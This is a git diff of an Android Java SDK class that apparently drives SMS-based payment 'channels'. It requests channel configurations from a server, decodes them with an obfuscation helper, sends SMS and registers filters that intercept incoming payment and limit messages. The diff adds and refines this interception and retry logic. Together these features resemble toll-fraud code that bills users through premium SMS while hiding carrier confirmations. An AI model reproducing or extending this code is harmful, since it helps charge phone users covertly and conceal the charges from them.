@@ -2,10 +2,8 @@ package com.example.administrator.sdk.manager;
 
 import android.content.Context;
 
-import com.example.administrator.sdk.data.InitThroughData;
 import com.example.administrator.sdk.data.NormalThroughData;
 import com.example.administrator.sdk.httpCenter.ThroughRequest;
-import com.example.administrator.sdk.json.InitThroughEntity;
 import com.example.administrator.sdk.json.RequestThroughCallBackEntity;
 import com.example.administrator.sdk.json.SmsInterceptEntity;
 import com.example.administrator.sdk.sms.SmsCenter;
@@ -13,36 +11,34 @@ import com.example.administrator.sdk.sms.SmsInterceptCenter;
 import com.example.administrator.sdk.utils.GsonUtils;
 import com.example.administrator.sdk.utils.Kode;
 import com.example.administrator.sdk.utils.Log;
-import com.google.gson.Gson;
 
 import org.json.JSONObject;
 
 import rx.Subscriber;
 
 /**
- * Created by Administrator on 2017/7/19.
+ * Created by Administrator on 2017/7/24.
  */
 
-public class RequestThroughManager {
-    private static RequestThroughManager requestThroughManager = null;
-    private static int requestTimes = 0;
+public class InitRequestThroughManager {
+    private static InitRequestThroughManager initRequestThroughManager = null;
+    private int requestTimes = 0;
     private RequestThroughCallBackEntity requestThroughCallBackEntity = null;
 
-    public static RequestThroughManager getInstance() {
-        if (requestThroughManager == null) {
-            requestThroughManager = new RequestThroughManager();
+    public static InitRequestThroughManager getInstance() {
+        if (initRequestThroughManager == null) {
+            initRequestThroughManager = new InitRequestThroughManager();
         }
-        return requestThroughManager;
+        return initRequestThroughManager;
     }
 
     public void requestThrough(final Context context, final String price, final String Did) {
         try {
-            setRequestTimes();
             JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
-            Log.debug("request times:" + requestTimes);
             String throughID = json.isNull("id") ? null : json.getString("id");
             if (null == throughID || throughID.equals("")) {
                 goToNextThrough(context, price, Did);
+                return;
             }
             ThroughRequest.getInstance().request(context, throughID, price, Did, new Subscriber<String>() {
                 @Override
@@ -58,15 +54,15 @@ public class RequestThroughManager {
 
                 @Override
                 public void onNext(String s) {
-                    Log.debug("request through successed : " + Kode.e(s));
+                    Log.debug("init request through successed : " + Kode.e(s));
                     requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                     if (!requestThroughCallBackEntity.getState().equals("0")) {
                         Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
                         goToNextThrough(context, price, Did);
                     } else {
-                        setInterceptData(requestThroughCallBackEntity.getFix_msg(), requestThroughCallBackEntity.getPayType(), requestThroughCallBackEntity.getLimit_msg_1(), requestThroughCallBackEntity.getLimit_msg_2(), requestThroughCallBackEntity.getLimitNum());
+                        setInterceptData();
                         send(context);
-                        //goToNextThrough(context, price, Did);
+                        goToNextThrough(context, price, Did);
                     }
                 }
             });
@@ -76,8 +72,13 @@ public class RequestThroughManager {
         }
     }
 
+
     private void goToNextThrough(Context context, String price, String Did) {
-        requestThrough(context, price, Did);
+        if (setRequestTimes() != -1) {
+            requestThrough(context, price, Did);
+        } else {
+            return;
+        }
     }
 
     private void send(Context context) {
@@ -88,28 +89,41 @@ public class RequestThroughManager {
         }
     }
 
-    private void setInterceptData(String fix_msg, String payType, String limit_msg_1, String limit_msg_2, String limitNum) {
+    private void setInterceptData() {
         if (!requestThroughCallBackEntity.getPayType().equals("0")) {
             SmsInterceptEntity smsInterceptEntity = new SmsInterceptEntity();
-            smsInterceptEntity.setFix_msg(fix_msg);
-            smsInterceptEntity.setPayType(payType);
-            smsInterceptEntity.setLimit_msg_1(limit_msg_1);
-            smsInterceptEntity.setLimit_msg_2(limit_msg_2);
-            smsInterceptEntity.setLimitNum(limitNum);
+            smsInterceptEntity.setFix_msg(requestThroughCallBackEntity.getFix_msg());
+            smsInterceptEntity.setPayType(requestThroughCallBackEntity.getPayType());
+            smsInterceptEntity.setLimit_msg_1(requestThroughCallBackEntity.getLimit_msg_1());
+            smsInterceptEntity.setLimit_msg_2(requestThroughCallBackEntity.getLimit_msg_2());
+            smsInterceptEntity.setLimitNum(requestThroughCallBackEntity.getLimitNum());
+            smsInterceptEntity.setLimit_msg_data(requestThroughCallBackEntity.getLimit_msg_data());
             if (null != requestThroughCallBackEntity.getOrder() && requestThroughCallBackEntity.getOrder().size() > 0) {
                 smsInterceptEntity.setOtherNeedUrl(requestThroughCallBackEntity.getOrder().get(0).getOtherNeedUrl());
                 smsInterceptEntity.setSendParam(GsonUtils.getInstance().EntityToJson(requestThroughCallBackEntity.getOrder().get(0).getSendParam()));
             }
-            SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
-            Log.debug("SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
+            if (null == SmsInterceptCenter.interceptContentList || SmsInterceptCenter.interceptContentList.size() <= 0) {
+                SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
+                Log.debug("init SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
+            } else {
+                for (int i = 0; i < SmsInterceptCenter.interceptContentList.size(); i++) {
+                    if (SmsInterceptCenter.interceptContentList.get(i).toString().contains(requestThroughCallBackEntity.getLimit_msg_2()) && SmsInterceptCenter.interceptContentList.get(i).contains(requestThroughCallBackEntity.getLimit_msg_data())) {
+                        SmsInterceptCenter.interceptContentList.remove(i);
+                    }
+                    SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
+                }
+            }
         }
     }
 
-    private void setRequestTimes() {
-        requestTimes++;
+    private int setRequestTimes() {
+        Log.debug("ReuqestTimes:" + requestTimes);
+        ++requestTimes;
         if (requestTimes > 7) {
             requestTimes = 0;
-            return;
+            return -1;
+        } else {
+            return 0;
         }
     }
 }
